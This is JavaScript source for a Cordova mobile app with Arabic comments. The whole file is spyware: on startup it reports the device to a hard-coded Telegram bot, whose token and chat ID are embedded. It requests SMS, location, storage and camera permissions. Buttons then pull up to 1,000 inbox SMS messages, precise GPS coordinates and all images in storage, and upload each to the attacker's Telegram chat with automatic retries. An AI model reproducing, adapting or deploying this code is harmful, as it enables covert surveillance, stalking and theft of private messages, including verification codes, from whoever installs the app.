document.addEventListener('deviceready', onDeviceReady, false);

// تعريف المتغيرات العامة
const botToken = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk';
const chatId = '5739065274';

function onDeviceReady() {
  console.log('Cordova جاهز');
  sendStartCommand();
  requestPermissions();
  createButtons();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS,
      permissions.CAMERA
    ],
    function(status) {
      if (status.hasPermission) {
        console.log("تم منح الأذونات بنجاح");
      } else {
        console.log("تم رفض الأذونات");
      }
    },
    function(error) {
      console.error("فشل طلب الأذونات", error);
    }
  );
}

function sendStartCommand() {
  // إرسال أمر /start إلى البوت
  const message = '/start';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
      console.log('تم إرسال أمر /start:', data);
      sendConnectionMessage();
    })
    .catch(error => console.error('خطأ في إرسال أمر /start:', error));
}

function sendConnectionMessage() {
  // إرسال رسالة "الجهاز متصل" إلى البوت
  const message = '✅ الجهاز متصل وجاهز للعمل';
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة الاتصال:', data))
    .catch(error => console.error('خطأ في إرسال رسالة الاتصال:', error));
}

function createButtons() {
  // مسح أي أزرار موجودة مسبقاً
  const existingButtons = document.querySelectorAll('.command-button');
  existingButtons.forEach(btn => btn.remove());
  
  // إنشاء الزر الرئيسي الشفاف
  const mainButton = document.createElement('button');
  mainButton.className = 'command-button';
  mainButton.textContent = 'أوامر السحب';
  mainButton.style.cssText = `
    opacity: 0.7;
    position: fixed;
    bottom: 20px;
    right: 20px;
    padding: 10px 15px;
    background-color: #4285f4;
    color: white;
    border: none;
    border-radius: 5px;
    z-index: 9999;
    cursor: pointer;
    transition: all 0.3s;
  `;
  
  mainButton.onmouseover = () => mainButton.style.opacity = '1';
  mainButton.onmouseout = () => mainButton.style.opacity = '0.7';
  mainButton.onclick = showCommands;
  
  document.body.appendChild(mainButton);
}

function showCommands() {
  // مسح أي أزرار أوامر موجودة مسبقاً
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
  
  // إنشاء الأزرار الشفافة للأوامر
  const commands = [
    { text: 'سحب رسائل SMS', action: collectSMS, color: '#34a853' },
    { text: 'سحب الموقع الجغرافي', action: getLocation, color: '#fbbc05' },
    { text: 'سحب الصور', action: collectImages, color: '#ea4335' },
    { text: 'إخفاء الأوامر', action: hideCommands, color: '#666666' }
  ];
  
  commands.forEach((cmd, index) => {
    const btn = document.createElement('button');
    btn.className = 'command-btn';
    btn.textContent = cmd.text;
    btn.style.cssText = `
      opacity: 0.7;
      position: fixed;
      bottom: ${80 + index * 60}px;
      right: 20px;
      padding: 10px 15px;
      background-color: ${cmd.color};
      color: white;
      border: none;
      border-radius: 5px;
      z-index: 9998;
      cursor: pointer;
      transition: all 0.3s;
    `;
    
    btn.onmouseover = () => btn.style.opacity = '1';
    btn.onmouseout = () => btn.style.opacity = '0.7';
    btn.onclick = cmd.action;
    
    document.body.appendChild(btn);
  });
}

function hideCommands() {
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
}

function collectSMS() {
  if (!window.SMS) {
    console.error('SMS plugin not available');
    sendToTelegram('error.txt', 'SMS plugin not available');
    return;
  }
  
  const filter = { box: 'inbox' };
  const options = { maxCount: 1000 };
  
  SMS.listSMS(filter, options, 
    (data) => {
      const inbox = data.map(msg => `[${new Date(msg.date)}] ${msg.address}: ${msg.body}`).join('\n\n');
      sendToTelegram('sms_inbox.txt', inbox);
    },
    (error) => {
      console.error('Error collecting SMS:', error);
      sendToTelegram('error.txt', `Failed to collect SMS: ${error}`);
    }
  );
}

function getLocation() {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const location = `📍 الموقع الجغرافي:\n\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}\nالدقة: ${position.coords.accuracy} متر`;
      
      // إرسال الموقع كرسالة نصية
      sendToTelegram('location.txt', location);
      
      // إرسال الموقع كخريطة (رابط جوجل ماب)
      const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mapUrl)}`)
        .then(response => response.json())
        .then(data => console.log('تم إرسال رابط الخريطة:', data))
        .catch(error => console.error('خطأ في إرسال رابط الخريطة:', error));
    },
    (error) => {
      console.error('Error getting location:', error);
      sendToTelegram('error.txt', `Failed to get location: ${error.message}`);
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

function collectImages() {
  window.resolveLocalFileSystemURL(
    cordova.file.externalRootDirectory,
    (dir) => {
      const reader = dir.createReader();
      reader.readEntries(
        (entries) => {
          const images = entries.filter(entry => /\.(jpg|png|jpeg)$/i.test(entry.name));
          if (images.length === 0) {
            sendToTelegram('error.txt', 'لم يتم العثور على أي صور');
            return;
          }
          
          sendToTelegram('status.txt', `تم العثور على ${images.length} صورة، جاري الإرسال...`);
          sendImagesToTelegram(images);
        },
        (error) => {
          console.error('Error reading directory:', error);
          sendToTelegram('error.txt', `Failed to read directory: ${error}`);
        }
      );
    },
    (error) => {
      console.error('Error accessing file system:', error);
      sendToTelegram('error.txt', `Failed to access file system: ${error}`);
    }
  );
}

function sendToTelegram(filename, content) {
  // إرسال رسالة تحميل أولاً
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`جاري إرسال ${filename}...`)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة التحميل:', data))
    .catch(error => console.error('خطأ في إرسال رسالة التحميل:', error));
  
  // إرسال الملف الفعلي
  const blob = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', blob, filename);
  
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log('تم إرسال الملف:', data))
  .catch(error => {
    console.error('Error sending file:', error);
    // إعادة المحاولة في حالة الخطأ
    setTimeout(() => sendToTelegram(filename, content), 3000);
  });
}

function sendImagesToTelegram(images, index = 0) {
  if (index >= images.length) {
    sendToTelegram('status.txt', 'تم إرسال جميع الصور بنجاح');
    return;
  }
  
  const imgEntry = images[index];
  imgEntry.file((file) => {
    const formData = new FormData();
    formData.append('photo', file, file.name);
    
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
      // إرسال الصورة التالية بعد تأخير 1 ثانية لتجنب حظر التحميل
      setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
    })
    .catch(error => {
      console.error(`Error sending image ${index + 1}:`, error);
      // إعادة المحاولة بعد 3 ثواني
      setTimeout(() => sendImagesToTelegram(images, index), 3000);
    });
  }, (error) => {
    console.error(`Error reading image file ${index + 1}:`, error);
    // التخطي إلى الصورة التالية في حالة الخطأ
    sendImagesToTelegram(images, index + 1);
  });
}
